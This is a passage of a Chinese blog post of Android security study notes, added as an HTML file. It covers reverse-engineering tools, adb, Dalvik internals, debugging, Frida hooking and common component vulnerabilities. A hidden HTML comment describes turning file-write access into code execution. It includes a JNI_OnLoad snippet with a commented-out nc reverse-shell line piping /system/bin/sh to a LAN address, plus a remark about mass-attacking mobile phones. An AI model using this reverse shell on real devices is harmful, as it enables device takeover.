@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>android安全技术点 - Dawuge&#039;s blog</title><meta description="移动端安全的东西很多，花样也很多，不论是从硬件架构，操作系统，还是其他安全角度来讲，每接触一项新事物，都有可能需要学习一整个生态内的安全知识。这里整理了一些我自己关于android的一些学习笔记和内容，以铺大饼的形式尽量囊括在入门Android安全所学习过的一些知识点，希望对大家有所帮助。"><meta property="og:type" content="blog"><meta property="og:title" content="android安全技术点"><meta property="og:url" content="http://yoursite.com/2020/02/24/2020-2-24-androidlearning/"><meta property="og:site_name" content="Dawuge&#039;s blog"><meta property="og:description" content="移动端安全的东西很多，花样也很多，不论是从硬件架构，操作系统，还是其他安全角度来讲，每接触一项新事物，都有可能需要学习一整个生态内的安全知识。这里整理了一些我自己关于android的一些学习笔记和内容，以铺大饼的形式尽量囊括在入门Android安全所学习过的一些知识点，希望对大家有所帮助。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://yoursite.com/img/in-post/zt/20147.PNG"><meta property="og:image" content="http://yoursite.com/img/in-post/zt/20143.PNG"><meta property="og:image" content="http://yoursite.com/img/in-post/zt/20144.PNG"><meta property="og:image" content="http://yoursite.com/img/in-post/zt/20145.PNG"><meta property="og:image" content="http://yoursite.com/img/in-post/zt/20149.PNG"><meta property="og:image" content="http://yoursite.com/img/in-post/zt/20145.PNG"><meta property="article:published_time" content="2020-02-23T16:00:00.000Z"><meta property="article:modified_time" content="2020-02-23T16:00:00.000Z"><meta property="article:author" content="Dawuge"><meta property="article:tag" content="notes"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/in-post/zt/20147.PNG"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2020/02/24/2020-2-24-androidlearning/"},"headline":"Dawuge's blog","image":[],"datePublished":"2020-02-23T16:00:00.000Z","dateModified":"2020-02-23T16:00:00.000Z","author":{"@type":"Person","name":"Dawuge"},"description":"移动端安全的东西很多，花样也很多，不论是从硬件架构，操作系统，还是其他安全角度来讲，每接触一项新事物，都有可能需要学习一整个生态内的安全知识。这里整理了一些我自己关于android的一些学习笔记和内容，以铺大饼的形式尽量囊括在入门Android安全所学习过的一些知识点，希望对大家有所帮助。"}</script><link rel="canonical" href="http://yoursite.com/2020/02/24/2020-2-24-androidlearning/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/" alt="Dawuge&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/categories/notes">Notes</a><a class="navbar-item" href="/categories/ctf">CTF</a><a class="navbar-item" href="/categories/vul">Linux</a><a class="navbar-item" href="/categories/vul/android">Android</a><a class="navbar-item" href="/categories/fuzz">Fuzz</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-23T16:00:00.000Z" title="2020-02-23T16:00:00.000Z">2020-02-24</time><span class="level-item"><a class="link-muted" href="/categories/notes/">notes</a><span> / </span><a class="link-muted" href="/categories/notes/android/">android</a></span><span class="level-item">37 分钟 读完 (大约 5575 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">android安全技术点</h1><div class="content"><p>移动端安全的东西很多，花样也很多，不论是从硬件架构，操作系统，还是其他安全角度来讲，每接触一项新事物，都有可能需要学习一整个生态内的安全知识。<br>这里整理了一些我自己关于android的一些学习笔记和内容，以铺大饼的形式尽量囊括在入门Android安全所学习过的一些知识点，希望对大家有所帮助。</p>
+<a id="more"></a>
+<p>ps：以下内容没有具体例子的分析，原因是其中的大部分知识点，我都是从其他师傅们的文章和代码一路学习过来的。文章也整理了以下放有我自己学习下来感觉收获较大的资源链接。</p>
+<p>总结下来，对于一个平台的逆向工程技术需要掌握的技能大致如下：</p>
+<ul>
+<li>操作系统的安全架构</li>
+<li>操作系统中可执行文件格式</li>
+<li>各类工具的使用</li>
+<li>反汇编代码的阅读理解</li>
+<li>调试器的使用（单独从工具中列出来以示重要性）</li>
+<li>网络抓包工具的使用</li>
+</ul>
+<p>本文大致分为以下几个模块：</p>
+<ul>
+<li>android端的基本安全知识</li>
+<li>android端的调试逆向</li>
+<li>android端的漏洞挖掘</li>
+</ul>
+<h2 id="android端的基本安全知识"><a href="#android端的基本安全知识" class="headerlink" title="android端的基本安全知识"></a><strong>android端的基本安全知识</strong></h2><ol>
+<li>编译与反编译</li>
+<li>虚拟机，汇编，文件结构</li>
+<li>Android系统和程序的启动过程</li>
+</ol>
+<p>其实总的来说就是—&gt;逆向工程 orz</p>
+<h3 id="编译与反编译"><a href="#编译与反编译" class="headerlink" title="编译与反编译"></a><strong>编译与反编译</strong></h3><p>apktool：可以将apk文件反编译生成smali格式的反汇编代码，也可将apktool重新编译生成apk文件。这里提醒一点就是具体厂商apktool使用会涉及到具体的资源包。</p>
+<p>学习途径：<a href="https://ibotpeaches.github.io/Apktool/documentation/">https://ibotpeaches.github.io/Apktool/documentation/</a></p>
+<p>adb：android sdk自带的命令行工具，用于与设备通信，便于执行各种设备操作</p>
+<p>学习途径：官方文档配上awesome系列基本上就够用了</p>
+<ol>
+<li><p><a href="https://developer.android.google.cn/studio/command-line/adb?hl=zh_cn2">https://developer.android.google.cn/studio/command-line/adb?hl=zh_cn2</a></p>
+</li>
+<li><p><a href="https://github.com/mzlogin/awesome-adb">https://github.com/mzlogin/awesome-adb</a></p>
+</li>
+</ol>
+<p>放几条常用指令：</p>
+<p>通过此指令可以获取所有包名</p>
+<ul>
+<li>adb shell pm list packages -f</li>
+</ul>
+<p>启动app</p>
+<ul>
+<li>adb shell am start -n [PACKAGE-NAME]/[ACTIVITY-NAME] </li>
+</ul>
+<p>列出所有正在执行app的activity</p>
+<ul>
+<li>adb shell dumpsys activity</li>
+</ul>
+<p>停止应用程序</p>
+<ul>
+<li>adb shell am force-stop [PACKAGE-NAME]或者adb shell am kill-all [PACKAGE-NAME]</li>
+</ul>
+<p>signapk，keytool和jarsigner： 用于给apk签名的工具（在这踩过坑，建议搞清楚），这里放一条我常用的解决办法，两条命令，前者是生成自己的密钥，后者是签名，具体选项代表自查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- keytool -genkey -keystore test.keystore  -alias test -keyalg RSA -validity 10000</span><br><span class="line">- jarsigner -verbose -keystore test.keystore -signedjar signed.apk unsigned.apk test</span><br></pre></td></tr></table></figure>
+<p>jd-gui和dex2jar: 反编译工具，通常用于阅读反编译生成的java代码</p>
+<p>当然这些都是些传统的工具，推荐在熟悉这些工具的具体运作方式之后再选择高效的集成工具，比如说jadx，jeb等。</p>
+<p>apk的打包流程：</p>
+<ul>
+<li>用aapt打包资源文件生成R.java文件</li>
+<li>处理aidl文件，生成相应java文件</li>
+<li><strong>编译</strong>工程源代码，生成相应class文件（重要的一步）</li>
+<li>转换所有class文件，并生成classes.dex文件（主要是将java字节码转换为Dalvik字节码）</li>
+<li>打包生成APK文件 </li>
+<li>对APK文件<strong>签名</strong></li>
+<li>对签名后的APK文件进行对齐处理</li>
+</ul>
+<p>APK的文件结构：</p>
+<p><img src="/img/in-post/zt/20147.PNG" alt=""></p>
+<p>整体流程如下：</p>
+<p><img src="/img/in-post/zt/20143.PNG" alt=""></p>
+<p>app的安装途径：系统程序安装，android市场安装，adb工具安装，sd卡安装<br>app安装过程可以追踪分析android系统程序PackageInstaller中PackageInstallerActivity来去理解，具体内容这里不再展开。</p>
+<h3 id="虚拟机，汇编，文件结构"><a href="#虚拟机，汇编，文件结构" class="headerlink" title="虚拟机，汇编，文件结构"></a><strong>虚拟机</strong>，汇编，文件结构</h3><p><strong>Dalvik虚拟机</strong>：其设计的初衷也许是是提高运行效率并规避与oracle的版权纠纷<br>其特点有：</p>
+<ol>
+<li>体积小，占用内存空间小</li>
+<li>dex可执行文件格式</li>
+<li>常量池采用32为索引值</li>
+<li>基于寄存器架构，有一套完整的指令集（同时有些寄存器没有用到）</li>
+<li>提供了对象生命周期管理，堆栈管理，线程管理，安全和异常管理，垃圾回收等功能</li>
+<li>android程序都运行在android系统进程里，每个进程对应一个Dalvik虚拟机实例</li>
+</ol>
+<p>Dalivik文件结构与java文件结构不同，Dalvik虚拟机通过dx工具对java类文件中常量池进行分解，消除冗余信息后在组合成新常量池</p>
+<p><img src="/img/in-post/zt/20144.PNG" alt=""></p>
+<p>又由于Dalvik虚拟机是基于寄存器架构的，相比于基于栈架构的java虚拟机，数据访问会快很多，同时Dalvik的指令即更加精简，程序的执行速度会快些。<br>android系统架构图：</p>
+<p><img src="/img/in-post/zt/20145.PNG" alt=""></p>
+<p>可见Dalvik属于Android运行时环境，和核心库共同承担Android应用程序的运行工作<br>这里有一点需要注意就是以消息通信的角度来看又可以分成另一个架构图，其中我们常关注的是native层和java层</p>
+<p><img src="/img/in-post/zt/20149.PNG" alt=""></p>
+<p>初次之外还有<strong>art</strong>，<strong>jvm</strong>，可以看这篇博客</p>
+<ul>
+<li><a href="https://blog.csdn.net/evan_man/article/details/52414390">https://blog.csdn.net/evan_man/article/details/52414390</a></li>
+</ul>
+<p><strong>Android系统和程序的启动过程：</strong></p>
+<p>Android系统启动加载内核后—-&gt; 执行init进程 —-&gt; 启动Zygote进程 —-&gt; 初始化Dalvik虚拟机 —&gt; 启动system_server进入Zygote模式，用socket等待命令 —&gt; Zygote收到命令后fork一个Dalvik虚拟机实例来执行程序入口函数<br>流程大致如下图：</p>
+<p><img src="/img/in-post/zt/20145.PNG" alt=""></p>
+<p>其中Zygote有三种创建进程的方法: </p>
+<ul>
+<li>fork()创建Zygote进程</li>
+<li>forkAndSpecialize()创建非Zygote进程</li>
+<li>forkSystemServer()创建系统服务进程</li>
+</ul>
+<p>fork后 —&gt; 虚拟机通过loadClassFromDex完成装载(用gDvm.loadedClass全局哈希表存储查询类) —&gt; dvmVerifyCodeFlow对代码检验 —&gt; FindClass查找装载main方法类 —&gt; dvmInterpret初始化解释器并执行字节码流</p>
+<p>以上就是Dalvik在程序执行时的要点，还有其涉及到的JIT技术和Dalvik的汇编代码内容繁杂，建议直接阅读官方文档或者相应书籍<br>其中dex文件主流反汇编工具有BakSmali与Dedexer，详细的dex文件格式内容也建议直接阅读相关资料或源码，这里就出DexFile的数据结构。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Struct DexFile&#123;</span><br><span class="line">    DexHeader Header;</span><br><span class="line">    DexStringId StringIds[stringIdsSize];</span><br><span class="line">    DexTypeId TypeIds[typeIdsSize];</span><br><span class="line">    DexProtoId ProtoIds[protoIdsSize];</span><br><span class="line">    DexFieldID FieldIds[fileIdsSize];</span><br><span class="line">    DexMethodId ClassDefs[classDefsSize];</span><br><span class="line">    DexData Data[];</span><br><span class="line">    DexLink LinkData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>图1</p>
+<h3 id="模拟器体系结构"><a href="#模拟器体系结构" class="headerlink" title="模拟器体系结构"></a><strong>模拟器体系结构</strong></h3><p>关于模拟器体系结构的梳理：<a href="https://bbs.pediy.com/thread-255672.htm">https://bbs.pediy.com/thread-255672.htm</a></p>
+<p>这个链接放在这里的原因是作者自己曾经根深蒂固地把arm和android两个概念紧紧的结合在一起了，忽略了android studio创建的模拟器是Intel x86架构的，导致踩过坑。</p>
+<h2 id="android端的调试"><a href="#android端的调试" class="headerlink" title="android端的调试"></a><strong>android端的调试</strong></h2><p>这里说是调试而不说逆向的原因是因为逆向的内容实在是太多了，入门可以参考《android软件安全与逆向分析》，《android攻防权威指南》以及《漏洞战争》中的部分内容来学习，这里选择调试中重要的内容来介绍。姑且就分为以下两者吧</p>
+<ul>
+<li>手动调试</li>
+<li>半自动化工具调试</li>
+</ul>
+<h3 id="smali的调试"><a href="#smali的调试" class="headerlink" title="smali的调试"></a><strong>smali的调试</strong></h3><p>在 smali 语法中，使用的都是寄存器，但是其在解释执行的时候，很多都会映射到栈中。通常每个smali会对应一个类。</p>
+<p><strong>编译 - smali2dex</strong></p>
+<p>给定一个 smali 文件，我们可以使用如下方式将 smali 文件编译为 dex 文件。</p>
+<ul>
+<li>java -jar smali.jar assemble  src.smali -o src.dex</li>
+</ul>
+<p><strong>运行 smali</strong></p>
+<p>在将 smali 文件编译成 dex 文件后，我们可以进一步执行<br>首先，使用 adb 将 dex 文件 push 到手机上</p>
+<ul>
+<li>adb push main.dex /sdcard/</li>
+</ul>
+<p>其次使用如下命令执行</p>
+<ul>
+<li>adb shell dalvikvm -cp /sdcard/main.dex main</li>
+</ul>
+<p><strong>AS + smalidea</strong></p>
+<ol>
+<li>打开设备中需要调试的apk，在cmd中运行命令 ：adb shell “dumpsys activity top | grep –color=always ACTIVITY”，就可以看到需要调试apk的包名、主acitivity以及进程号（或者也可以使用adb shell “dumpsys activity activities | grep xxxActivity”）</li>
+<li>使用命令以debug模式启动apk:adb shell am start -D -n 包名/主activity名，然后你的设备可以看到wait for debugger</li>
+<li>再一次运行第一步的命令，获取新的进程号：adb shell “dumpsys activity top | grep –color=always ACTIVITY” 或者运行命令： adb shell “ps | grep 包名”亦可</li>
+<li>adb forward tcp:debug端口 jdwp:apk进程号</li>
+<li>以上步骤可以直接在as中logcat里选定调试进程，然后选择Attach Debugger To Android Process</li>
+<li>查看与包名相关JDWP命令：adb shell “ps -t | grep -A 8 包名”</li>
+<li>查看所有JDWP进程命令：adb shell “ps -t | grep -B 6 JDWP”</li>
+</ol>
+<p><strong>smali的修改</strong></p>
+<p>之前尝试用apk改之理，但是由于版本太老了有较多不方便，所以弃坑，现在我通常是apktool反编译后修改，然后再编译并使用自签名，这样也可以达到修改安装使用的效果</p>
+<p><strong>基本原生程序</strong></p>
+<!-- 现在大部分手机都有pie技术，那较为简便的方法是调试时将文件的pie关闭 -->
+
+<p>如elf文件就可以</p>
+<ul>
+<li>使用 android_server 的 PIE 版本</li>
+<li>利用 010Editor 将可执行 ELF 文件的 header 中的 elf header 字段中的 e_type 改为 ET_DYN(3)。</li>
+</ul>
+<p><strong>so 原生程序的调试</strong></p>
+<p>其加载方式有system.load和system.loadlibrary两种，前者加载绝对路径，后者加载libs下的so文件，两者都会在内部调用doload函数，其流程大致如下</p>
+<p>doload -&gt; nativeload -&gt; 对应到Dalvik_java_lang_Runtime_nativeLoad-&gt; dvmLoadNativeCode加载相应的native code -&gt; findSharedLibEntry(判断是否已经加载了这个库以及是否是对应的class loader) –如没有加载–&gt; dlopen打开 –&gt; si-&gt;CallConstructors()初始化 –&gt; 创建表且用dlsym获取对应so文件中 JNI_OnLoad 函数</p>
+<p>静态分析 java 层： 没什么好说的，理解程序逻辑去做就好了</p>
+<p>静态分析原生层程序基本的过程如下</p>
+<ul>
+<li>提取 so 文件</li>
+<li>ida 反编译 so 文件阅读 so 代码</li>
+<li>根据 java 层的代码来分析 so 代码。</li>
+<li>根据 so 代码的逻辑辅助整个程序的分析。</li>
+</ul>
+<p>在android studio 3.12后已经将ddms移除了，所以官方的建议是</p>
+<p>图2</p>
+<p>当我们不能使用ddms时意味着我们使用jdb进行转发时无法确定具体的port，有一种方法是加载程序运行时需要的so文件，然后在一些关键函数比如jniString()函数下断，运行apk后，然后attach其进程即可。</p>
+<p>当然有时候会需要在jni_load下断，而so文件又被处理或者干脆jni_load被加密了，这时需要pull出来libdvm so文件,参考我们加载方式的流程，直接查找dvmLoadNativeCode，函数中调用dlopen加载so，返回时so已经加载且已经初始化完成，调试下就能找到。</p>
+<p><strong>hook</strong></p>
+<p>hook的方法很多，但原理就是这么几种，主要有Dalvik,ART,inline,GOT等对象hook，这个有太多大佬写过各种类型的hook了，hook的框架也有许多，展开分析内容太多了，就不再累述了。</p>
+<p>Frida hook分为注入进程，直接在源码中修改，以及动态链接三种方式</p>
+<p>frida的交互实现大致可以这么理解：默认监听27042端口，对目标进程gadget在启动时进行阻塞，直到实现attach进程或者在使用spawn()后再resume恢复进程，当然这些状态都可以通过配置修改，也可以提前设置好过滤器将特定脚本加载到特定应用中。</p>
+<p>由于frida是个轻量级的hook框架，所以还是比较容易添加自己想要的功能，具体请看官网的frida架构图。</p>
+<p>frida有一个功能可以为我们生成一个进程而不是将它注入到运行中的进程中，它注入到Zygote中，生成我们的进程并且等待输入。即spawn是注入zygote而attach是注入当前进程。</p>
+<p>这里有遇到过的一些小坑，分别是设备检测问题和windows端的编码问题：</p>
+<p><a href="https://github.com/frida/frida/issues/1111">https://github.com/frida/frida/issues/1111</a></p>
+<p><a href="https://github.com/rkern/line_profiler/issues/37">https://github.com/rkern/line_profiler/issues/37</a></p>
+<!-- 
+Socket端口通信运行在会话层，并不是应用层，Socket抓包的原理与应用层Http(s)有着显著的区别。准确的说，Http(s)抓包是真正的“中间人”抓包，而Socket抓包是在接口上进行转储；Http(s)抓包是明显的将一套C/S架构通信分裂成两套完整的通信过程，而Socket抓包是在接口上将发送与接收的内容存储下来，并不干扰其原本的通信过程。
+
+对于安卓应用来说，Socket通信天生又分为两种Java层Socket通信和Native层Socket通信。
+
+    Java层：使用的是java.net.InetAddress、java.net.Socket、java.net.ServerSocket等类，与证书绑定的情形类似，也可能存在着自定义框架的Socket通信，这时候就需要具体情况具体分析，比如谷歌的protobuf框架等；
+    Native层：一般使用的是C Socket API，一般hook住send()和recv()函数可以得到其发送和接受的内容
+
+抓包方法分为三种，接口转储、驱动转储和路由转储：
+
+    接口转储：比如给outputStream.write下hook，把内容存下来看看，可能是经过压缩、或加密后的包，毕竟是二进制，一切皆有可能；
+    驱动转储：使用tcpdump将经过网口驱动时的数据包转储下来，再使用Wireshark进行分析；
+    路由转储：自己做个路由器，运行jnettop，观察实时进过的流量和IP，可以使用WireShark实时抓包，也可以使用tcpdump抓包后用WireShark分析。 -->
+
+
+<!-- 实现android上的全局UAF和heap over-flow检测
+       这里只说一下思路
+       1、全局hook 具体方法可以在论坛找（比如注入app_process）
+       2、hook  malloc 和 free函数将其替换
+       3、在注入的so中添加signal处理函数，将崩溃或heap overflow的信息记录到文件。
+       4、运行app （此时已经可以检测该app的so是否存在uaf或heap over-flow漏洞） -->
+
+
+<h2 id="android漏洞挖掘"><a href="#android漏洞挖掘" class="headerlink" title="android漏洞挖掘"></a><strong>android漏洞挖掘</strong></h2><p>一直想挖android上的漏洞，但真正上手的时候发现自己缺乏很多真实场景的经验和思路，毕竟漏洞挖掘和ctf题差距还是不一般的大（汗），于是就整理了下android上常见的问题，尽可能的去整理些思路出来。</p>
+<p>ps：这里有一个点没有涉及，就是关于android端会涉及到较多的抓包分析工作，但无奈我是个二进制菜鸡，就不班门弄斧的推荐了。</p>
+<p>我们都知道android四大组件，所以这里的大部分内容来自对瘦蛟舞大佬多年前文章的阅读笔记（汗，果然小白只能玩大佬玩剩下的）</p>
+<h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a><strong>Activity</strong></h3><p><strong>常见的关注点</strong></p>
+<ul>
+<li>activity的生命周期</li>
+<li>launch mode</li>
+<li>taskAffinity</li>
+<li>task and activity</li>
+<li>android:exported </li>
+<li>android:permission</li>
+</ul>
+<p><strong>关键方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">onCreate(Bundle savedInstanceState)</span><br><span class="line">setResult(int resultCode, Intent data)</span><br><span class="line">startActivity(Intent intent)</span><br><span class="line">startActivityForResult(Intent intent, int requestCode)</span><br><span class="line">onActivityResult(int requestCode, int resultCode, Intent data)</span><br><span class="line">setResult (int resultCode, Intent data)</span><br><span class="line">getStringExtra (String name)</span><br><span class="line">addFlags(int flags)</span><br><span class="line">setFlags(int flags)</span><br><span class="line">setPackage(String packageName)</span><br><span class="line">getAction()</span><br><span class="line">setAction(String action)</span><br><span class="line">getData()</span><br><span class="line">setData(Uri data)</span><br><span class="line">getExtras()</span><br><span class="line">putExtra(String name, String value)</span><br></pre></td></tr></table></figure>
+
+<p>activity分为四种，在考虑安全时分别从创建activity和使用activity时考虑</p>
+<p>广播接收器既可以在manifest文件中声明，也可以在代码中进行动态的创建，并以调用Context.registerReceiver()的方式注册至系统。</p>
+<p>注意关注类型 protectionlevel 权限</p>
+<h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a><strong>Broadcast</strong></h3><p>广播需要注意广播的对象范围以及持久性带来的影响</p>
+<p><strong>关键方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sendBroadcast(intent)</span><br><span class="line">sendOrderedBroadcast(intent, null, mResultReceiver, null, 0, null, null)</span><br><span class="line">onReceive(Context context, Intent intent)</span><br><span class="line">getResultData()</span><br><span class="line">abortBroadcast()</span><br><span class="line">registerReceiver()</span><br><span class="line">unregisterReceiver()</span><br><span class="line">LocalBroadcastManager.getInstance(this).sendBroadcast(intent)</span><br><span class="line">sendStickyBroadcast(intent)</span><br></pre></td></tr></table></figure>
+
+<p>ContentProvider用来存放和获取数据并使这些数据可以被所有的应用程序访问。它们是应用程序之间共享数据的唯一方法；不包括所有Android软件包都能访问的公共储存区域。</p>
+<h3 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a><strong>Content Provider</strong></h3><p><strong>关键方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public void addURI (String authority, String path, int code)</span><br><span class="line">public static String decode (String s)</span><br><span class="line">public ContentResolver getContentResolver()</span><br><span class="line">public static Uri parse(String uriString)</span><br><span class="line">public ParcelFileDescriptor openFile (Uri uri, String mode)</span><br><span class="line">public final Cursor query(Uri uri, String[] projection,String selection, String[] selectionArgs, String sortOrder)</span><br><span class="line">public final int update(Uri uri, ContentValues values, String where,String[] selectionArgs)</span><br><span class="line">public final int delete(Uri url, String where, String[] selectionArgs)</span><br><span class="line">public final Uri insert(Uri url, ContentValues values)</span><br><span class="line">public abstract void grantUriPermission (String toPackage, Uri uri, int modeFlags) &#x2F;&#x2F;Grant permission to access a specific Uri to another package, regardless of whether that package has general permission to access the Uri&#39;s content provider. 临时授权</span><br><span class="line">public abstract void revokeUriPermission (Uri uri, int modeFlags) &#x2F;&#x2F;Remove all permissions to access a particular content provider Uri that were previously added with grantUriPermission(String, Uri, int). 移动授权</span><br></pre></td></tr></table></figure>
+
+<h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a><strong>Service</strong></h3><p>startService与bindService两者的区别就是使Service的周期改变.由startService启动的Service必须要有stopService来结束Service,不调用stopService则会造成Activity结束了而Service还运行着.bindService启动的Service可以由unbindService来结束,也可以在Activity结束之后(onDestroy)自动结束.</p>
+<p><strong>关键方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">onStartCommand() </span><br><span class="line">OnBind() </span><br><span class="line">OnCreate()</span><br><span class="line">OnDestroy() </span><br><span class="line">public abstract boolean bindService (Intent service, ServiceConnection conn, int flags)</span><br><span class="line">startService()</span><br><span class="line">protected abstract void onHandleIntent (Intent intent)</span><br><span class="line">public boolean onUnbind (Intent intent)</span><br></pre></td></tr></table></figure>
+
+<!-- 
+Intent Schem URL
+过滤规则缺失或者存在缺陷
+
+zjdroid:脱壳/api监控
+justTrustMe:忽略证书效验
+IntentMonitor:可以监控显/隐意图 intent
+Xinstaller:设置应用/设备属性...
+XPrivacy:权限管理 -->
+<!-- 
+busybox netstat -tunlp   查看应用占用端口
+
+虫洞漏洞，寄生兽漏洞
+
+利用常见思路：
+
+关于sdk的漏洞利用：
+现在我们已经有文件写入权限,把它转化成执行权限就可以反弹 shell 了,想想之前的寄生兽漏洞.思路就比较清晰了.将文件写入插件或者 so 文件中进行覆盖后执行即可.(注意需要是第三方的 so..因为 app 的 so 是系统权限,应用本身也是无权限进行写操作的)
+hook DexClassLoader 构造方法后可以发现加载的插件
+取得dex文件后将其转换为smali代码后注入命令，然后通过dexclassloader优化，
+创建的so库通过JNI_Onload来反弹shell的例子
+<figure class="highlight plain"><figcaption><span>JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    JNIEnv* env &#x3D; NULL;</span><br><span class="line">    jint result &#x3D; -1;</span><br><span class="line">    int ret;</span><br><span class="line">    if ((*vm)-&gt;GetEnv(vm, (void**) &amp;env, JNI_VERSION_1_4) !&#x3D; JNI_OK) &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* success -- return valid version number *&#x2F;</span><br><span class="line">    result &#x3D; JNI_VERSION_1_4;</span><br><span class="line">    &#x2F;* 反弹shell *&#x2F;</span><br><span class="line">    &#x2F;&#x2F;ret &#x3D; system(&quot;nc 192.168.8.163 8088|&#x2F;system&#x2F;bin&#x2F;sh|nc 192.168.8.163 9999&quot;);</span><br><span class="line">    ret &#x3D; system(&quot;id &gt; &#x2F;data&#x2F;data&#x2F;com.baidu.input&#x2F;jni_id.txt&quot;);</span><br><span class="line">    LOGI(&quot;ret value of system is %d&quot;,ret);</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>静默安装apk的利用方式需要root权限</p>
+<p>3G/4G下的手机其实全部处于一个巨大无比的局域网中，只要通过4G手机开个热点，就可以用电脑连接热点然后用扫描器和攻击脚本对全国甚至全世界连接了3G/4G的手机进行攻击。在家远程入侵一亿台手机不再是梦。 –&gt;</p>
+<p><strong>android端的一些常见漏洞</strong></p>
+<p>1、组件公开安全漏洞</p>
+<p>2、Content Provider文件目录遍历漏洞</p>
+<p>3、AndroidManifest.xml中AllowBackup安全检测</p>
+<p>4、Intent劫持风险安全检测</p>
+<p>5、数据存储安全检测</p>
+<p>6、拒绝服务攻击安全检测</p>
+<p>7、随机数生成函数使用错误</p>
+<p>8、中间人攻击漏洞</p>
+<p>9、从sdcard加载dex漏洞</p>
+<p>10、Activity被劫持风险</p>
+<p>11、WebView高危接口安全检测</p>
+<p>12、WebView明文存储密码漏洞</p>
+<p>13、Android HTTPS中间人劫持漏洞</p>
+<p>14、Webview file跨域访问</p>
+<h3 id="热修复以及脱壳和混淆"><a href="#热修复以及脱壳和混淆" class="headerlink" title="热修复以及脱壳和混淆"></a><strong>热修复以及脱壳和混淆</strong></h3><p>有bug就要有patch，所以不可避免的会涉及到热修复。<br>同时，加壳和混淆是为了保护产权。</p>
+<p>因为暂时没接触到太多样例，这里也班门弄斧了。</p>
+<p>热修复可以理解为紧急补丁但无需重新发布版本的意思，主要分为代码修复，资源修复，so库修复，框架有</p>
+<ul>
+<li>native hook：dexposed，andfix， hotfix</li>
+<li>java multidex：qzone， qfix， nuwa， rocoofix</li>
